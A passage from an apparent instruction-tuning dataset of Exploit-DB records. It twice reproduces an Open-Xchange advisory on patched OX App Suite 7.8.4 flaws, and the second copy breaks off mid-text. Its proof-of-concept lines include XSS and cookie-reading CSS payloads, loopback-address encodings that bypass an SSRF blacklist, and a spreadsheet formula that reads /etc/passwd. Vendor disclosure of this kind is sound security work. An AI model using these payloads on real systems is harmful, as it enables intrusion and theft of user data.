            "Exploit": "Product: OX App Suite\nVendor: OX Software GmbH\n\n\nInternal reference: 55872 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: frontend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev30, 7.8.2-rev30, 7.8.3-rev36, 7.8.4-rev18\nVendor notification: 2017-10-18\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5754\nCVSS: n/a\n\nVulnerability Details:\nInternet Explorer does not properly support modern Content Security Policies (\"CSP\"), which act as a failsafe for certain XSS attacks. Since the \"Open in Browser\" feature is a potential attack vector to inject malicious content, we removed that option at the user interface. Instead, users shall download attachments and open them from their device. This removes the issue of executing script-code under the same domain.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. This is a precautionary change\n\nSolution:\nWe no longer offer \"Open in Browser\" for IE based browsers. Microsoft Edge is not affected by this change.\n\n---\n\nInternal reference: 56333 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-11-30\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Michael Reizelman\nCVE reference: CVE-2018-5756\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nPermission checks for tasks were incomplete with regards to folder-to-object association.\n\nRisk:\nUsers within the same context could delete other users tasks.\n\nSteps to reproduce:\n1. Create a task as User A (ID: 1)\n2. As User B, trigger a /api/tasks?action=delete call with task ID 1 but a valid task folder ID of User B\n\nSolution:\nWe enhanced permission checks for tasks for the \"delete\" call and check for folder-to-object association.\n\n---\n\nInternal reference: 56359 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-01\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Michael Reizelman\nCVE reference: CVE-2018-5756\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nPermission checks for appointments were incomplete with regards to folder-to-object association.\n\nRisk:\nUsers within the same context were able to add external participants to other users appointments. Those users would potentially get notified about subsequent appointment changes and could therefor gather information beyond their permission level.\n\nSteps to reproduce:\n1. Create a appointment as User A (ID: 1)\n2. As User B, trigger a /api/calendar?action=confirm call with appointment ID 1 but a valid appointment folder ID of User B\n3. Include a external participant in this \"confirm\" call\n\n{\"confirmmessage\":\"\",\"confirmation\":1, \"type\":5, \"mail\":\"test@example.com\"}\n\nSolution:\nWe enhanced permission checks for appointments for the \"confirm\" call and check for folder-to-object association.\n\n---\n\nInternal reference: 56334 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-11-30\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite tries to look up external mail account configuration using XML files for auto-configuration, that are placed at most mail providers hosts. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.\n\nRisk:\nBy validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.\n\nSteps to reproduce:\n1. Provide a malicious HTTP service that redirects any incoming request to a local IP/Port combination using HTTP 301.\n2. Attempt to add a external mail account that uses the same domain as the malicious HTTP service\n3. Check error codes and response times of the /api/autoconfig?action=get request\n\nSolution:\nWe now deny access to network internal endpoints when following HTTP redirects.\n\n---\n\nInternal reference: 56407 (Bug ID)\nVulnerability type: Content Spoofing (CWE-451)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: frontend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev31, 7.8.2-rev31, 7.8.3-rev41, 7.8.4-rev20\nVendor notification: 2017-12-06\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5753\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nThe origin of a E-Mail is determined by the \"From\" or \"Sender\" address, which are provided by Mail headers and usually consist of a arbitrary personal part \"Mr. Foo Bar (CEO)\" and the actual sender address \"<foo@example.com>\". Using specific unicode characters at the personal part could be used to disguise the actual origin of the E-Mail.\n\nRisk:\nAttackers can use this vulnerability to support social-engineering based attacks to individual users by tampering the origin of an E-Mail.\n\nSteps to reproduce:\n1. Create a E-Mail which contains very long \"personal\" parts or mail addresses as personal parts.\n\nSolution:\nWe now display the actual sender address next to the \"personal\" part of the sender and make sure that this information cannot be influenced by externally provided content.\n\n---\n\nInternal reference: 56056 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev35, 7.8.2-rev38, 7.8.3-rev41, 7.8.4-rev19\nVendor notification: 2017-11-08\nSolution date: 2017-12-13\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2017-17062\nCVSS: 3.1 (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nCertain \"user attributes\" (UA identifier, login timestamps...) can be saved by using arbitrary users identifiers within the same context. The original intention was to allow this for users with elevated permissions.\n\nRisk:\nWhile no way to access other users attributes is known, this can be used to void non-repudiation.\n\nSteps to reproduce:\n1. Forge a API request to store/request custom user attributes for a different user (ID: 3)\n\nProof of concept:\nPUT https://example.com/ajax/user?session=xxx&name=tree&id=3&action=setAttribute\n{\"name\":\"foo\", \"value\": \"bar\"}\n\nSolution:\nWe check permissions on a user- and context-level to make sure just privileged users can set and read user attributes.\n\n---\n\nInternal reference: 56580 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: office-web\nReport confidence: Confirmed\nSolution status: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.3-rev12, 7.8.4-rev9\nVendor notification: 2017-12-22\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nScript code within Presentations is being executed when transferring it to the clipboard. This is done by \"copying\" or \"cutting\" text using keyboard commands.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious presentation file which contains script-code as text\n2. Cloak the code by using low-contrast colors, font sizes etc.\n\nProof of concept:\n\"><img src=x onerror=prompt(document.domain)>\n\nSolution:\nWe make sure that client-side content gets cleaned up and not evaluated before transferring to the clipboard.\n\n---\n\nInternal reference: 56582 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-22\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Secator\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nMalformed CSS can be used to inject script code.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious E-Mail and send it to a OX App Suite user\n2. Open that E-Mail as user\n\nProof of concept:\n<style>\n.a {\n        font-family: </styl/**/e>;\n        font-family: </sty/**/le>;\n        font-family: </s/*data*/tyle>;\n}\n.<iframe/onload=alert(document[\"cookie\"])> { }\n</style>\n\nSolution:\nWe enhanced the sanitizer to consider malformed CSS content and improve stability.\n\n---\n\nInternal reference: 56619 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2018-01-03\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite can be used to embed external RSS feeds, which are requested using HTTP. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.\n\nRisk:\nBy validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.\n\nSteps to reproduce:\n1. Provide a malicious HTTP service that redirects any incoming HTTP request to a local IP/Port combination using HTTP 301.\n2. Add a RSS feed that points to the same host as the malicious HTTP service\n\nSolution:\nWe now deny access to network internal endpoints when following HTTP redirects.\n\n---\n\nInternal reference: 56477 (Bug ID)\nVulnerability type: Information Exposure (CWE-200)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-12\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5751\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nInviting external users to share content creates temporary user accounts to handle permissions. Several APIs expose information about user accounts, however data of external guests is not meant to be available for others than the sharee and users that got access to the shared content.\n\nRisk:\nInformation about guest users, primarily E-Mail addresses, is available to all users within the same context even though they are not entitled to access it.\n\nSteps to reproduce:\n1. Share content with an external user by using the \"invite by mail\" option\n2. As another user of the same context, query the \"groups\" and \"users\" API\n\n\nSolution:\nWe restrict access to guest user data and reduce the amount of data provided for groups.\n\n---\n\nInternal reference: 56706 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-10-16\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite uses several blacklists to restrict access of external services. Those do not cover non-decimal representations of IP addresses and special IPv6 related addresses. Some libraries accept such values but our blacklist fails to convert them when checking.\n\nRisk:\nAttackers can forge server-side requests to internal systems to gather information about network infrastructure and services.\n\nProof of concept:\n1. Convert the IP address of a internal host, which is protected by a blacklist, to a octal or hexadecimal value\n127.0.0.1: 0177.00.00.01 (8-bit octal) or 0x7f00000 (32-bit hexadecimal)\n\n2. Use IPv6 mapping of IPv4 addresses\n127.0.0.1: 0:0:0:0:0:FFFF:7F00:0001\n\n3. Use very special representations of \"local\" addresses\n127.0.0.1: 0000\n\n4. Use IPv6 local addresses\n127.0.0.1: :: or ::1\n\nSolution:\nWe did adjust our blacklist implementation to cover IPv6 and other representations of restricted addresses.\n\n---\n\nInternal reference: 56718 (Bug ID)\nVulnerability type: Path Traversal (CWE-22)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: readerengine\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4\nVendor notification: 2018-01-10\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Zhang Tianqi(pnig0s)\nCVE reference: CVE-2018-5755\nCVSS: 7.7 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)\n\nVulnerability Details:\nSpecifically crafted spreadsheets can be exploited to extract system information, including content and location of local files.\n\nRisk:\nAttackers can read local files of the host running the \"readerengine\" component depending on their local access permissions for the \"open-xchange\" user. This includes configuration files which potentially include passwords and other sensitive information. Some functions allow to access internal system information like operating system and paths. Other than that its possible to check the existence of certain files that provide hints about patch level and other details.\n\nSteps to reproduce:\n1. Create a malicious ODS based spreadsheet and use formulas that reference local files or read system information\n\nProof of concept:\n=WEBSERVICE(\"file:///etc/passwd\")\n=CELL(\"filename\")\n=INFO(\"system\")\n\nSolution:\nWe now filter ODS and OOXML function content against a blacklist.\n\n---\n\nInternal reference: 56740 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4\nVendor notification: 2018-01-12\nSolution date: 2018-04-24\nPublic disclosure: 2018-06-08\nResearcher Credits: Secator\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nMedia-types can be altered in a way that our content scanner is circumvented and potentially harmful content gets passed to the requesting client.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious XML file and modify its media-type\n2. Upload, embed and make someone open this file\n\nProof of concept:\n\"t,text/html\" or \"t/@,image/svg+xml\"\n\"garbage\\u00ff/garbage\" (will work for Firefox as it \"guesses\" the media-type based on the filename and multipart data)\n\nSolution:\nWe now reject to define media-types which are not covered by application logic."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44881",
        "output": {
            "ID": "44881",
            "File": "exploits/xml/webapps/44881.txt",
            "Description": "OX App Suite 7.8.4 - Multiple Vulnerabilities",
            "Date Published": "2018-06-12",
            "Author": "Open-Xchange",
            "Type": "webapps",
            "Platform": "xml",
            "Port": "",
            "Date Added": "2018-06-12",
            "Date Updated": "2018-06-12",
            "Verified": "0",
            "Codes": [
                "CVE-2018-5756;CVE-2018-5755;CVE-2018-5754;CVE-2018-5753;CVE-2018-5752;CVE-2018-5751;CVE-2017-17062"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Product: OX App Suite\nVendor: OX Software GmbH\n\n\nInternal reference: 55872 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: frontend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev30, 7.8.2-rev30, 7.8.3-rev36, 7.8.4-rev18\nVendor notification: 2017-10-18\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5754\nCVSS: n/a\n\nVulnerability Details:\nInternet Explorer does not properly support modern Content Security Policies (\"CSP\"), which act as a failsafe for certain XSS attacks. Since the \"Open in Browser\" feature is a potential attack vector to inject malicious content, we removed that option at the user interface. Instead, users shall download attachments and open them from their device. This removes the issue of executing script-code under the same domain.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. This is a precautionary change\n\nSolution:\nWe no longer offer \"Open in Browser\" for IE based browsers. Microsoft Edge is not affected by this change.\n\n---\n\nInternal reference: 56333 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-11-30\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Michael Reizelman\nCVE reference: CVE-2018-5756\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nPermission checks for tasks were incomplete with regards to folder-to-object association.\n\nRisk:\nUsers within the same context could delete other users tasks.\n\nSteps to reproduce:\n1. Create a task as User A (ID: 1)\n2. As User B, trigger a /api/tasks?action=delete call with task ID 1 but a valid task folder ID of User B\n\nSolution:\nWe enhanced permission checks for tasks for the \"delete\" call and check for folder-to-object association.\n\n---\n\nInternal reference: 56359 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-01\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Michael Reizelman\nCVE reference: CVE-2018-5756\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nPermission checks for appointments were incomplete with regards to folder-to-object association.\n\nRisk:\nUsers within the same context were able to add external participants to other users appointments. Those users would potentially get notified about subsequent appointment changes and could therefor gather information beyond their permission level.\n\nSteps to reproduce:\n1. Create a appointment as User A (ID: 1)\n2. As User B, trigger a /api/calendar?action=confirm call with appointment ID 1 but a valid appointment folder ID of User B\n3. Include a external participant in this \"confirm\" call\n\n{\"confirmmessage\":\"\",\"confirmation\":1, \"type\":5, \"mail\":\"test@example.com\"}\n\nSolution:\nWe enhanced permission checks for appointments for the \"confirm\" call and check for folder-to-object association.\n\n---\n\nInternal reference: 56334 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-11-30\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite tries to look up external mail account configuration using XML files for auto-configuration, that are placed at most mail providers hosts. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.\n\nRisk:\nBy validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.\n\nSteps to reproduce:\n1. Provide a malicious HTTP service that redirects any incoming request to a local IP/Port combination using HTTP 301.\n2. Attempt to add a external mail account that uses the same domain as the malicious HTTP service\n3. Check error codes and response times of the /api/autoconfig?action=get request\n\nSolution:\nWe now deny access to network internal endpoints when following HTTP redirects.\n\n---\n\nInternal reference: 56407 (Bug ID)\nVulnerability type: Content Spoofing (CWE-451)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: frontend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev31, 7.8.2-rev31, 7.8.3-rev41, 7.8.4-rev20\nVendor notification: 2017-12-06\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5753\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nThe origin of a E-Mail is determined by the \"From\" or \"Sender\" address, which are provided by Mail headers and usually consist of a arbitrary personal part \"Mr. Foo Bar (CEO)\" and the actual sender address \"<foo@example.com>\". Using specific unicode characters at the personal part could be used to disguise the actual origin of the E-Mail.\n\nRisk:\nAttackers can use this vulnerability to support social-engineering based attacks to individual users by tampering the origin of an E-Mail.\n\nSteps to reproduce:\n1. Create a E-Mail which contains very long \"personal\" parts or mail addresses as personal parts.\n\nSolution:\nWe now display the actual sender address next to the \"personal\" part of the sender and make sure that this information cannot be influenced by externally provided content.\n\n---\n\nInternal reference: 56056 (Bug ID)\nVulnerability type: Improper Privilege Management (CWE-269)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev35, 7.8.2-rev38, 7.8.3-rev41, 7.8.4-rev19\nVendor notification: 2017-11-08\nSolution date: 2017-12-13\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2017-17062\nCVSS: 3.1 (CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N)\n\nVulnerability Details:\nCertain \"user attributes\" (UA identifier, login timestamps...) can be saved by using arbitrary users identifiers within the same context. The original intention was to allow this for users with elevated permissions.\n\nRisk:\nWhile no way to access other users attributes is known, this can be used to void non-repudiation.\n\nSteps to reproduce:\n1. Forge a API request to store/request custom user attributes for a different user (ID: 3)\n\nProof of concept:\nPUT https://example.com/ajax/user?session=xxx&name=tree&id=3&action=setAttribute\n{\"name\":\"foo\", \"value\": \"bar\"}\n\nSolution:\nWe check permissions on a user- and context-level to make sure just privileged users can set and read user attributes.\n\n---\n\nInternal reference: 56580 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: office-web\nReport confidence: Confirmed\nSolution status: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.8.3-rev12, 7.8.4-rev9\nVendor notification: 2017-12-22\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nScript code within Presentations is being executed when transferring it to the clipboard. This is done by \"copying\" or \"cutting\" text using keyboard commands.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious presentation file which contains script-code as text\n2. Cloak the code by using low-contrast colors, font sizes etc.\n\nProof of concept:\n\"><img src=x onerror=prompt(document.domain)>\n\nSolution:\nWe make sure that client-side content gets cleaned up and not evaluated before transferring to the clipboard.\n\n---\n\nInternal reference: 56582 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-22\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Secator\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nMalformed CSS can be used to inject script code.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious E-Mail and send it to a OX App Suite user\n2. Open that E-Mail as user\n\nProof of concept:\n<style>\n.a {\n        font-family: </styl/**/e>;\n        font-family: </sty/**/le>;\n        font-family: </s/*data*/tyle>;\n}\n.<iframe/onload=alert(document[\"cookie\"])> { }\n</style>\n\nSolution:\nWe enhanced the sanitizer to consider malformed CSS content and improve stability.\n\n---\n\nInternal reference: 56619 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2018-01-03\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite can be used to embed external RSS feeds, which are requested using HTTP. Redirects of external HTTP services could be used to access local or internal networks instead, when looking up that external account information.\n\nRisk:\nBy validating error codes and request duration, attackers can get insight about internal network configuration, open ports and associated services. Such information can serve as reconnaissance for further attacks.\n\nSteps to reproduce:\n1. Provide a malicious HTTP service that redirects any incoming HTTP request to a local IP/Port combination using HTTP 301.\n2. Add a RSS feed that points to the same host as the malicious HTTP service\n\nSolution:\nWe now deny access to network internal endpoints when following HTTP redirects.\n\n---\n\nInternal reference: 56477 (Bug ID)\nVulnerability type: Information Exposure (CWE-200)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-12-12\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nCVE reference: CVE-2018-5751\nCVSS: 4.3 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)\n\nVulnerability Details:\nInviting external users to share content creates temporary user accounts to handle permissions. Several APIs expose information about user accounts, however data of external guests is not meant to be available for others than the sharee and users that got access to the shared content.\n\nRisk:\nInformation about guest users, primarily E-Mail addresses, is available to all users within the same context even though they are not entitled to access it.\n\nSteps to reproduce:\n1. Share content with an external user by using the \"invite by mail\" option\n2. As another user of the same context, query the \"groups\" and \"users\" API\n\n\nSolution:\nWe restrict access to guest user data and reduce the amount of data provided for groups.\n\n---\n\nInternal reference: 56706 (Bug ID)\nVulnerability type: Server-Side Request Forgery (CWE-918)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev36, 7.8.2-rev39, 7.8.3-rev44, 7.8.4-rev22\nVendor notification: 2017-10-16\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Alan Watt\nCVE reference: CVE-2018-5752\nCVSS: 6.4 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L)\n\nVulnerability Details:\nOX App Suite uses several blacklists to restrict access of external services. Those do not cover non-decimal representations of IP addresses and special IPv6 related addresses. Some libraries accept such values but our blacklist fails to convert them when checking.\n\nRisk:\nAttackers can forge server-side requests to internal systems to gather information about network infrastructure and services.\n\nProof of concept:\n1. Convert the IP address of a internal host, which is protected by a blacklist, to a octal or hexadecimal value\n127.0.0.1: 0177.00.00.01 (8-bit octal) or 0x7f00000 (32-bit hexadecimal)\n\n2. Use IPv6 mapping of IPv4 addresses\n127.0.0.1: 0:0:0:0:0:FFFF:7F00:0001\n\n3. Use very special representations of \"local\" addresses\n127.0.0.1: 0000\n\n4. Use IPv6 local addresses\n127.0.0.1: :: or ::1\n\nSolution:\nWe did adjust our blacklist implementation to cover IPv6 and other representations of restricted addresses.\n\n---\n\nInternal reference: 56718 (Bug ID)\nVulnerability type: Path Traversal (CWE-22)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: readerengine\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4\nVendor notification: 2018-01-10\nSolution date: 2018-02-08\nPublic disclosure: 2018-06-08\nResearcher Credits: Zhang Tianqi(pnig0s)\nCVE reference: CVE-2018-5755\nCVSS: 7.7 (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)\n\nVulnerability Details:\nSpecifically crafted spreadsheets can be exploited to extract system information, including content and location of local files.\n\nRisk:\nAttackers can read local files of the host running the \"readerengine\" component depending on their local access permissions for the \"open-xchange\" user. This includes configuration files which potentially include passwords and other sensitive information. Some functions allow to access internal system information like operating system and paths. Other than that its possible to check the existence of certain files that provide hints about patch level and other details.\n\nSteps to reproduce:\n1. Create a malicious ODS based spreadsheet and use formulas that reference local files or read system information\n\nProof of concept:\n=WEBSERVICE(\"file:///etc/passwd\")\n=CELL(\"filename\")\n=INFO(\"system\")\n\nSolution:\nWe now filter ODS and OOXML function content against a blacklist.\n\n---\n\nInternal reference: 56740 (Bug ID)\nVulnerability type: Cross-Site Scripting (CWE-80)\nVulnerable version: 7.8.4 and earlier\nVulnerable component: backend\nReport confidence: Confirmed\nSolution status: Fixed by Vendor\nFixed version: 7.6.3-rev3, 7.8.2-rev4, 7.8.3-rev5, 7.8.4-rev4\nVendor notification: 